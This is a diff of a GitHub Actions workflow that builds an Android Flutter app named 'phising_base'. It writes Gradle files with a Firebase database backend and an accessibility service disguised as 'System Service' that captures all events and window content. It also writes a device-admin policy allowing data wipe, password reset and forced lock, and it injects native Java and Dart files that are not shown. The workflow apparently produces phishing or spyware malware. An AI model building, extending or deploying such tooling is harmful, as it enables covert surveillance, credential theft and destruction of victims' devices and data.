@@ -28,7 +28,6 @@ jobs:
           distribution: 'temurin'
           java-version: '17'
 
-      # 🔥 FIX: KUNCI VERSI FLUTTER KE 3.22.0 (BIAR GA BENTROK DEPENDENSI)
       - name: Setup Flutter
         uses: subosito/flutter-action@v2
         with:
@@ -42,7 +41,102 @@ jobs:
           cd phising_base
           
           # ============================================
-          # 1. MANIFEST (SUDAH DITAMBAH xmlns:tools)
+          # FIX 1: BUILD.GRADLE (BIAR FIREBASE JAVA KEBACA)
+          # ============================================
+          cat > android/build.gradle << 'EOF'
+          buildscript {
+              ext.kotlin_version = '1.7.10'
+              repositories {
+                  google()
+                  mavenCentral()
+              }
+              dependencies {
+                  classpath 'com.android.tools.build:gradle:7.3.0'
+                  classpath "org.jetbrains.kotlin:kotlin-gradle-plugin:$kotlin_version"
+                  classpath 'com.google.gms:google-services:4.3.15'
+              }
+          }
+          allprojects {
+              repositories {
+                  google()
+                  mavenCentral()
+              }
+          }
+          rootProject.buildDir = '../build'
+          subprojects {
+              project.buildDir = "${rootProject.buildDir}/${project.name}"
+          }
+          subprojects {
+              project.evaluationDependsOn(':app')
+          }
+          tasks.register("clean", Delete) {
+              delete rootProject.buildDir
+          }
+          EOF
+
+          cat > android/app/build.gradle << 'EOF'
+          def localProperties = new Properties()
+          def localPropertiesFile = rootProject.file('local.properties')
+          if (localPropertiesFile.exists()) {
+              localPropertiesFile.withReader('UTF-8') { reader ->
+                  localProperties.load(reader)
+              }
+          }
+          def flutterRoot = localProperties.getProperty('flutter.sdk')
+          if (flutterRoot == null) {
+              throw new GradleException("Flutter SDK not found. Define location with flutter.sdk in the local.properties file.")
+          }
+          def flutterVersionCode = localProperties.getProperty('flutter.versionCode')
+          if (flutterVersionCode == null) {
+              flutterVersionCode = '1'
+          }
+          def flutterVersionName = localProperties.getProperty('flutter.versionName')
+          if (flutterVersionName == null) {
+              flutterVersionName = '1.0'
+          }
+          apply plugin: 'com.android.application'
+          apply plugin: 'kotlin-android'
+          apply from: "$flutterRoot/packages/flutter_tools/gradle/flutter.gradle"
+          android {
+              namespace "com.example.phising_base"
+              compileSdkVersion flutter.compileSdkVersion
+              ndkVersion flutter.ndkVersion
+              compileOptions {
+                  sourceCompatibility JavaVersion.VERSION_1_8
+                  targetCompatibility JavaVersion.VERSION_1_8
+              }
+              kotlinOptions {
+                  jvmTarget = '1.8'
+              }
+              sourceSets {
+                  main.java.srcDirs += 'src/main/kotlin'
+              }
+              defaultConfig {
+                  applicationId "com.example.phising_base"
+                  minSdkVersion 21
+                  targetSdkVersion flutter.targetSdkVersion
+                  versionCode flutterVersionCode.toInteger()
+                  versionName flutterVersionName
+                  multiDexEnabled true
+              }
+              buildTypes {
+                  release {
+                      signingConfig signingConfigs.debug
+                  }
+              }
+          }
+          flutter {
+              source '../..'
+          }
+          dependencies {
+              implementation "org.jetbrains.kotlin:kotlin-stdlib-jdk7:$kotlin_version"
+              implementation platform('com.google.firebase:firebase-bom:32.7.0')
+              implementation 'com.google.firebase:firebase-database'
+          }
+          EOF
+
+          # ============================================
+          # FIX 2: MANIFEST & STRINGS
           # ============================================
           cat > android/app/src/main/AndroidManifest.xml << 'EOF'
           <manifest xmlns:android="http://schemas.android.com/apk/res/android"
@@ -139,8 +233,36 @@ jobs:
           </manifest>
           EOF
 
+          mkdir -p android/app/src/main/res/values
+          cat > android/app/src/main/res/values/strings.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <resources>
+              <string name="accessibility_desc">System Service</string>
+          </resources>
+          EOF
+
+          mkdir -p android/app/src/main/res/xml
+          cat > android/app/src/main/res/xml/accessibility_service_config.xml << 'EOF'
+          <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+              android:accessibilityEventTypes="typeAllMask"
+              android:accessibilityFeedbackType="feedbackGeneric"
+              android:accessibilityFlags="flagDefault"
+              android:canRetrieveWindowContent="true"
+              android:description="@string/accessibility_desc" />
+          EOF
+
+          cat > android/app/src/main/res/xml/device_admin.xml << 'EOF'
+          <device-admin xmlns:android="http://schemas.android.com/apk/res/android">
+              <uses-policies>
+                  <wipe-data />
+                  <reset-password />
+                  <force-lock />
+              </uses-policies>
+          </device-admin>
+          EOF
+
           # ============================================
-          # 2. PUBSPEC (VERSI DEPENDENSI DIKUNCI)
+          # FIX 3: PUBSPEC & ASET
           # ============================================
           mkdir -p assets
           if [ -n "${{ github.event.inputs.icon_url }}" ]; then
@@ -193,40 +315,6 @@ jobs:
           }
           EOF
 
-          # ============================================
-          # 3. XML RESOURCES
-          # ============================================
-          mkdir -p android/app/src/main/res/values
-          cat > android/app/src/main/res/values/strings.xml << 'EOF'
-          <?xml version="1.0" encoding="utf-8"?>
-          <resources>
-             <string name="accessibility_desc">System Service</string>
-          </resources>
-          EOF
-
-          mkdir -p android/app/src/main/res/xml
-          cat > android/app/src/main/res/xml/accessibility_service_config.xml << 'EOF'
-          <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
-              android:accessibilityEventTypes="typeAllMask"
-              android:accessibilityFeedbackType="feedbackGeneric"
-              android:accessibilityFlags="flagDefault"
-              android:canRetrieveWindowContent="true"
-              android:description="@string/accessibility_desc" />
-          EOF
-
-          cat > android/app/src/main/res/xml/device_admin.xml << 'EOF'
-          <device-admin xmlns:android="http://schemas.android.com/apk/res/android">
-              <uses-policies>
-                  <wipe-data />
-                  <reset-password />
-                  <force-lock />
-              </uses-policies>
-          </device-admin>
-          EOF
-
-          # ============================================
-          # 4. FIREBASE OPTIONS
-          # ============================================
           cat > lib/firebase_options.dart << 'EOF'
           import 'package:firebase_core/firebase_core.dart' show FirebaseOptions;
           class DefaultFirebaseOptions {
@@ -243,7 +331,7 @@ jobs:
           EOF
 
       # ============================================
-      # 5. INJECT JAVA FILES
+      # FIX 4: INJECT JAVA
       # ============================================
       - name: Inject Native Java Files
         run: |
@@ -1388,7 +1476,7 @@ jobs:
           EOF
 
       # ============================================
-      # 6. INJECT DART FILES
+      # FIX 5: INJECT DART
       # ============================================
       - name: Inject Dart Services
         run: |
